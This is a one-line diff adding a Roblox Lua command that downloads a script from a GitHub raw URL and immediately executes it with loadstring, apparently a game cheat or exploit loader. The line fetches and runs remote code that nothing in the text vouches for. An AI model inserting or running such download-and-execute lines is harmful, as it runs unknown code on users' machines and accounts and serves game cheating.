@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/topprefectmatch/loaders/main/loaders/police-night-rider-testing-spam3-lhpyawgnntzqs1.lua"))()
